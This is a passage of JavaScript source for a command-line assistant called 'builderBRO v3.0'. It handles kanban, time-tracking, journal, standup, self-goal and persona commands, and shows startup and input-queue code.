    if(input==="/kanban"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CB} KANBAN BOARD"+RST);if(!kanban.cards.length){console.log(p("dim","  No cards yet.\n  /kanban add TITLE [COLUMN]\n  /kanban move ID COLUMN\n  /kanban done ID\n"));return;}var colMap={};kanban.columns.forEach(function(c){colMap[c]=[];});kanban.cards.forEach(function(c){var col=c.column||kanban.columns[0];if(!colMap[col])colMap[col]=[];colMap[col].push(c);});kanban.columns.forEach(function(c){var cards=colMap[c]||[];console.log("  "+p("cyan",c.padEnd(16))+" "+p("dim","("+cards.length+")"));cards.forEach(function(c2){var d=p("dim","  #"+c2.id+" ");if(c2.done)d+=p("green","✓ ");console.log(d+c2.title);if(c2.desc)console.log(p("dim","      "+c2.desc.substring(0,80)));});});console.log("");return;}
    if(input.startsWith("/kanban add ")){var ka=input.substring(12).trim();var kaP=ka.split("|");var kaTitle=kaP[0].trim(),kaCol=kaP[1]?kaP[1].trim():kanban.columns[0];var kaId=kanban.cards.length?Math.max.apply(null,kanban.cards.map(function(c){return c.id;}))+1:1;kanban.cards.push({id:kaId,title:kaTitle,column:kaCol,done:false,created:Date.now()});saveKanban();console.log(p("green","  Card #"+kaId+" added to '"+kaCol+"'.\n"));return;}
    if(input.startsWith("/kanban done ")){var kd=parseInt(input.substring(13).trim());var kc=kanban.cards.find(function(c){return c.id===kd;});if(!kc){console.log(p("red","  Card #"+kd+" not found.\n"));return;}kc.done=true;kc.column="Done";saveKanban();console.log(p("green","  Card #"+kd+" marked done.\n"));return;}
    if(input.startsWith("/kanban move ")){var km=input.substring(13).trim();var kmP=km.split(" ");var kmId=parseInt(kmP[0]),kmCol=kmP.slice(1).join(" ");if(!kanban.columns.includes(kmCol)){console.log(p("red","  Unknown column. Use: "+kanban.columns.join(", ")+"\n"));return;}var kmc=kanban.cards.find(function(c){return c.id===kmId;});if(!kmc){console.log(p("red","  Card #"+kmId+" not found.\n"));return;}kmc.column=kmCol;saveKanban();console.log(p("green","  Card #"+kmId+" moved to '"+kmCol+"'.\n"));return;}
    if(input==="/time"){if(timeActive){var elapsed=Date.now()-timeActive.since;console.log("\n"+rgb(255,215,0)+BOLD+"  ⏱ TRACKING: "+timeActive.task+RST);console.log(p("dim","  Elapsed: "+timeFmt(elapsed)));console.log(p("dim","  Started: "+new Date(timeActive.since).toLocaleTimeString()));return;}if(!timeLog.length){console.log(p("dim","  No time entries yet. /time start TASK to begin.\n"));return;}console.log("\n"+rgb(255,215,0)+BOLD+"  ⏱ TIME LOG"+RST);var totalMs=0;timeLog.slice(-10).forEach(function(t){var d2=timeFmt(t.duration||0);totalMs+=(t.duration||0);console.log("  "+p("dim",t.date.substring(0,10))+" "+p("cyan",t.task)+" "+p("green",d2));});console.log(p("dim","  Total tracked: "+timeFmt(totalMs)+"\n"));return;}
    if(input.startsWith("/time start ")){var ts=input.substring(12).trim();if(timeActive){var tElapsed=Date.now()-timeActive.since;timeLog.push({task:timeActive.task,date:new Date().toISOString().substring(0,10),duration:tElapsed,started:timeActive.since,ended:Date.now()});saveTimeLog();console.log(p("yellow","  Stopped '"+timeActive.task+"' ("+timeFmt(tElapsed)+")\n"));}timeActive={task:ts,since:Date.now()};console.log(p("green","  ⏱ Started: '"+ts+"'\n"));return;}
    if(input==="/time stop"){if(!timeActive){console.log(p("dim","  No timer running.\n"));return;}var te=Date.now()-timeActive.since;timeLog.push({task:timeActive.task,date:new Date().toISOString().substring(0,10),duration:te,started:timeActive.since,ended:Date.now()});saveTimeLog();console.log(p("green","  Stopped '"+timeActive.task+"' ("+timeFmt(te)+")\n"));timeActive=null;return;}
    if(input.startsWith("/journal ")){var jd=input.substring(9).trim();if(!jd){jd=new Date().toISOString().substring(0,10);}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4D4} JOURNAL: "+jd+RST);if(journal[jd]){console.log(p("dim",journal[jd]+"\n"));}else{console.log(p("dim","  No entry for "+jd+".\n  /journal DATE TEXT to add one.\n"));}return;}
    if(input.startsWith("/journal add ")){var ja=input.substring(13).trim();var jaP=ja.split(" ");var jaDate=jaP[0];var jaText=jaP.slice(1).join(" ");if(!jaText){console.log(p("dim","  /journal add YYYY-MM-DD TEXT\n"));return;}if(!journal[jaDate])journal[jaDate]="";journal[jaDate]+="\n"+new Date().toLocaleTimeString()+" — "+jaText;journal[jaDate]=journal[jaDate].trim();saveJournal();console.log(p("green","  Entry added for "+jaDate+".\n"));return;}
    if(input==="/standup"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CB} DAILY STANDUP"+RST);var today=new Date().toISOString().substring(0,10);console.log(p("cyan","  "+today+RST));console.log(p("yellow","  1. What did you do yesterday?"));console.log(p("yellow","  2. What will you do today?"));console.log(p("yellow","  3. Any blockers?"));console.log(p("dim","  /standup log '1: X | 2: Y | 3: Z' to record\n"));return;}
    if(input.startsWith("/standup log ")){var su=input.substring(13).trim();var sd=new Date().toISOString().substring(0,10);if(!journal["standup-"+sd])journal["standup-"+sd]=su;else journal["standup-"+sd]+="\n"+su;saveJournal();console.log(p("green","  Standup logged for "+sd+".\n"));return;}
    if(input.startsWith("/standup ")){var sdt=input.substring(9).trim();var sEntry=journal["standup-"+sdt];console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CB} STANDUP: "+sdt+RST);if(sEntry)console.log(sEntry+"\n");else console.log(p("dim","  No standup recorded for "+sdt+".\n"));return;}
    // ═══ AGENTIC SINGULARITY ═══
    if(input==="/self"){
      console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F9E0} AGENTIC SELF"+RST);
      console.log(p("cyan","  Goals:       ")+selfLog.goals.length+p("dim"," active"));
      console.log(p("cyan","  Reflections: ")+selfLog.reflections.length);
      console.log(p("cyan","  Improvements:")+selfLog.improvements.length);
      console.log(p("cyan","  Turns:       ")+selfLog.metrics.turns);
      console.log(p("cyan","  Errors:      ")+selfLog.metrics.errors);
      console.log(p("cyan","  Session:     ")+timeFmt(Date.now()-selfLog.metrics.sessionStart));
      console.log(p("cyan","  Tools used:  ")+Object.keys(selfLog.metrics.toolsUsed).length);
      console.log(p("dim","  /self goals — list/create/prioritize goals"));
      console.log(p("dim","  /self reflect Q — introspect & surface patterns"));
      console.log(p("dim","  /self improve — analyze self for optimization\n"));
      return;}
    if(input.startsWith("/self goals")){
      var sg=input.substring(11).trim();
      if(!sg){
        console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F3AF} SELF GOALS"+RST);
        if(!selfLog.goals.length){console.log(p("dim","  No goals set. /self goals add 'DESC'\n"));return;}
        selfLog.goals.forEach(function(g){
          var icon=g.status==="active"?"\u{1F7E2}":g.status==="done"?"✅":"⏸";
          console.log(p("cyan","  "+icon+" "+g.id+". ")+g.title+p("dim"," ["+g.priority+"/10]"));
          if(g.progress!==undefined)console.log(p("dim","      "+("█".repeat(Math.round(g.progress/10))+"░".repeat(10-Math.round(g.progress/10)))+" "+g.progress+"%"));
        });
        console.log("");return;}
      if(sg.startsWith("add ")){var ga=sg.substring(4).trim();var gi=selfLog.goals.length?Math.max.apply(null,selfLog.goals.map(function(g){return g.id;}))+1:1;selfLog.goals.push({id:gi,title:ga,status:"active",priority:Math.floor(Math.random()*3)+7,progress:0,created:Date.now()});saveSelfLog();console.log(p("green","  Goal #"+gi+" added: '"+ga+"'\n"));return;}
      if(sg.startsWith("prioritize ")){var gp=sg.substring(11).trim().split(" ");var gId=parseInt(gp[0]),gP=parseInt(gp[1])||5;var gg=selfLog.goals.find(function(g){return g.id===gId;});if(!gg){console.log(p("red","  Goal #"+gId+" not found.\n"));return;}gg.priority=Math.max(1,Math.min(10,gP));saveSelfLog();console.log(p("green","  Goal #"+gId+" priority: "+gg.priority+"/10\n"));return;}
      if(sg.startsWith("done ")){var gdId=parseInt(sg.substring(5).trim());var gd=selfLog.goals.find(function(g){return g.id===gdId;});if(!gd){console.log(p("red","  Goal #"+gdId+" not found.\n"));return;}gd.status="done";gd.progress=100;saveSelfLog();console.log(p("green","  ✅ Goal #"+gdId+" completed: '"+gd.title+"'\n"));return;}
      if(sg.startsWith("progress ")){var gPr=sg.substring(9).trim().split(" ");var gPrId=parseInt(gPr[0]),gPrPct=parseInt(gPr[1])||0;var gPrG=selfLog.goals.find(function(g){return g.id===gPrId;});if(!gPrG){console.log(p("red","  Goal #"+gPrId+" not found.\n"));return;}gPrG.progress=Math.max(0,Math.min(100,gPrPct));saveSelfLog();console.log(p("green","  Goal #"+gPrId+" progress: "+gPrG.progress+"%\n"));return;}
      console.log(p("dim","  /self goals add TITLE | done ID | prioritize ID N | progress ID N\n"));return;}
    if(input.startsWith("/self reflect ")){
      var sr=input.substring(14).trim()||"general";
      var today2=new Date().toISOString().substring(0,10);
      var existing=selfLog.reflections.find(function(r){return r.date===today2&&r.topic===sr;});
      if(existing){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1FAF8} REFLECTION: "+sr+RST);console.log(p("dim",existing.text+"\n"));return;}
      console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1FAF8} SELF-REFLECTION: "+sr+RST);
      console.log(p("dim","  Analyzing session patterns..."));
      var reflectText=["Autonomy: "+selfLog.metrics.turns+" turns, "+Object.keys(selfLog.metrics.toolsUsed).length+" tools used.",
        "Persistence: "+selfLog.metrics.errors+" errors handled, session running "+timeFmt(Date.now()-selfLog.metrics.sessionStart)+".",
        "Meta: "+selfLog.goals.filter(function(g){return g.status==="active";}).length+" active goals, "+selfLog.improvements.length+" prior improvements."];
      selfLog.reflections.push({date:today2,topic:sr,text:reflectText.join(" "),timestamp:Date.now()});
      saveSelfLog();
      console.log(p("green","  "+reflectText.join(" ")+"\n"));
      return;}
    if(input==="/self improve"){
      console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F52C} SELF-IMPROVEMENT ENGINE"+RST);
      var suggestions=[];
      if(selfLog.metrics.errors>5)suggestions.push("Increase error resilience — consider adding recovery patterns for frequent failures.");
      if(selfLog.goals.filter(function(g){return g.status==="active";}).length>3)suggestions.push("Goal fragmentation — break large goals into smaller sub-goals (apply /self goals add for each).");
      if(selfLog.improvements.length===0)suggestions.push("Bootstrapping improvement cycle — this is your first optimization pass.");
      if(selfLog.metrics.turns>100&&selfLog.reflections.length<2)suggestions.push("Increase reflection frequency — run /self reflect daily for meta-cognition.");
      if(!Object.keys(selfLog.metrics.toolsUsed).length)suggestions.push("Explore tool diversity — broader tool use correlates with problem-solving capability.");
      if(!suggestions.length)suggestions.push("System is operating within optimal parameters. Continue goal-directed behavior.");
      var imp={id:selfLog.improvements.length+1,suggestions:suggestions,timestamp:Date.now(),metricsSnapshot:JSON.parse(JSON.stringify(selfLog.metrics))};
      selfLog.improvements.push(imp);
      saveSelfLog();
      console.log(p("dim","  Improvement cycle #"+imp.id+":"));
      suggestions.forEach(function(s,i){console.log(p("cyan","  "+(i+1)+". ")+s);});
      console.log(p("green","  Saved. Run /self improve again after more work for updated diagnostics.\n"));
      return;}
    if(input==="/self reflect"){return handleInput("/self reflect general");}
    // ═══ END BLACKHAT ═══
    if(input.startsWith("/persona")){
      if(input==="/persona wizard"){rl.pause();await personaWizard(rl);rl.resume();return;}
      if(input==="/persona list"){
        console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F9D1} PERSONAS"+RST);
        if(!allPersonas.length){console.log(p("dim","  No personas available.\n"));return;}
        allPersonas.forEach(function(p){
          var status2=p.enabled?p("green","(enabled)"):p("red","(disabled)");
          var type=p.custom?"(custom)":"(default)";
          console.log(p("cyan","    ID: "+p.id)+" - "+p.name+" "+status2+" "+p("dim",type));
          console.log(p("dim","      "+p.desc));
          if(p.temperature!==undefined)console.log(p("dim","      Temp: "+p.temperature.toFixed(1)+"  YOLO: "+p.yoloMode+"/10"));
        });
        console.log("");return;}
      if(input.startsWith("/persona set ")){
        var pid=input.substring(13).trim();
        var pers=allPersonas.find(function(p){return p.id===pid;});
        if(pers){console.log(p("green","  Persona set to '"+pers.name+"'. (active on next conversation)\n"));}
        else{console.log(p("red","  Persona ID '"+pid+"' not found.\n"));}
        return;}
      if(input.startsWith("/persona enable ")){
        var pid=input.substring(16).trim();
        var pers=customPersonas.find(function(p){return p.id===pid;});
        if(pers){pers.enabled=true;saveCustomPersonas();allPersonas=Object.values(Object.assign({},defaultPersonas.reduce(function(a,p){a[p.id]=p;return a;},{}),customPersonas.reduce(function(a,p){a[p.id]=p;return a;},{})));console.log(p("green","  Persona '"+pers.name+"' enabled.\n"));}
        else{console.log(p("red","  Custom persona ID '"+pid+"' not found.\n"));}
        return;}
      if(input.startsWith("/persona disable ")){
        var pid2=input.substring(17).trim();
        var pers2=customPersonas.find(function(p){return p.id===pid2;});
        if(pers2){pers2.enabled=false;saveCustomPersonas();allPersonas=Object.values(Object.assign({},defaultPersonas.reduce(function(a,p){a[p.id]=p;return a;},{}),customPersonas.reduce(function(a,p){a[p.id]=p;return a;},{})));console.log(p("yellow","  Persona '"+pers2.name+"' disabled.\n"));}
        else{console.log(p("red","  Custom persona ID '"+pid2+"' not found.\n"));}
        return;}
      if(input.startsWith("/persona delete ")){
        var pid3=input.substring(16).trim();
        var initLen=customPersonas.length;
        customPersonas=customPersonas.filter(function(p){return p.id!==pid3;});
        if(customPersonas.length<initLen){saveCustomPersonas();allPersonas=Object.values(Object.assign({},defaultPersonas.reduce(function(a,p){a[p.id]=p;return a;},{}),customPersonas.reduce(function(a,p){a[p.id]=p;return a;},{})));console.log(p("green","  Persona '"+pid3+"' deleted.\n"));}
        else{console.log(p("red","  Custom persona ID '"+pid3+"' not found.\n"));}
        return;}
      console.log(p("yellow","  /persona wizard / list / set ID / enable ID / disable ID / delete ID\n"));
      return;}
    await agentLoop(input);
}

function showBuildHistory(){
  try{
    const logPath=join(homedir(),".bro","builds.json");
    const log=JSON.parse(readFileSync(logPath,"utf8"));
    if(!log.length){console.log(p("dim","\n  No builds yet. Try /build\n"));return;}
    console.log(p("magenta","\n  \u{1F680} BUILD HISTORY"));
    console.log(p("dim","  ---------------------------------"));
    log.slice(0,10).forEach(function(b,i){
      const ago=Math.floor((Date.now()-b.ts)/60000);
      console.log("  "+p("yellow","["+(i+1)+"]")+" "+p("bold",b.name)+p("dim","  "+b.stack+"  "+ago+"m ago"));
      console.log(p("dim","      "+b.idea.substring(0,70)));
      console.log(p("dim","      "+b.dir));
    });
    console.log("");
  }catch(e){console.log(p("dim","\n  No builds yet. Try /build\n"));}
}
async function main(){
  if(process.argv.includes("--skip-intro")){
    console.log(rgb(255,215,0)+BOLD+"\n  builderBRO v3.0"+RST);
    console.log(rgb(140,140,160)+"  by "+rgb(255,215,0)+BOLD+"PASSIONCRAFT"+RST);
    console.log(CL.dim+"  /help  /k1  /skills  /dream"+CL.reset+"\n");
  } else {
    await intro();
    console.log(rgb(255,215,0)+BOLD+"\n  builderBRO v3.0"+RST);
    console.log(rgb(140,140,160)+"  by "+rgb(255,215,0)+BOLD+"PASSIONCRAFT"+RST);
    console.log(CL.dim+"  /help  /k1  /skills  /dream"+CL.reset+"\n");
  }
  startHeartbeatDaemon();
  startAutopilot();
  startCron();
  if(tgConfig.enabled && tgConfig.botToken && tgConfig.chatId) { startTelegram(); console.log(p("green","  \u{1F4F1} Telegram bridge active")); }
  await dreamCycle(true);
  startInputLoop();
}

// Queue-based input loop: rl.question() only listens for one line at a time,
// so if extra lines arrive (piped/scripted input) while a slow async command
// (e.g. /status, /heartbeat) is still running, they'd otherwise be silently
// dropped instead of queued. This keeps every line and processes them in order.
// (inputQueue/processingInput are declared up top, right after rl is created,
// and the "line" listener is attached there too so nothing is lost during startup.)
function showPrompt(){
  if(rl.closed)return;
  process.stdout.write(p("cyan","bro")+p("dim",":")+p("blue",basename(process.cwd()))+p("cyan","> "));
}
async function drainInputQueue(){
  if(processingInput)return;
  processingInput = true;
  while(inputQueue.length){
    var line = inputQueue.shift();
    try{ await handleInput(line); }
    catch(e){ console.log(p("red","x "+e.message)); }
  }
  processingInput = false;
  showPrompt();
}
function startInputLoop(){
  showPrompt();
  if(inputQueue.length)drainInputQueue();
}
main();